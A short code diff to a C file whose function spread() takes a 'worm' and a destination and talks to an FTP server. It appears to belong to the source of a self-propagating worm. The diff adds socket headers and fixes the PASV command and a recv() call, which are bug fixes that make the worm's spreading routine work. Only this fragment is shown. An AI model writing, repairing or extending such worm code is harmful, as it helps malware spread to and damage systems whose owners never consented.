@@ -1,5 +1,8 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
 //---
 #include "spread.h"
 
@@ -10,12 +13,12 @@ int spread(int fd, const char *worm, const char *dest) {
   char garbage[64];
   size_t read_bytes;
 
-  if(send(fd, "PASV\0", 5, 0) < 0) {
+  if(send(fd, "PASV", 4, 0) < 0) {
     perror("send");
     return -1;
   }
 
-  if(recv(fd, garbage, sizeof garbage) < 0) {
+  if(recv(fd, garbage, sizeof garbage, 0) < 0) {
     perror("recv");
     return -1;
   }
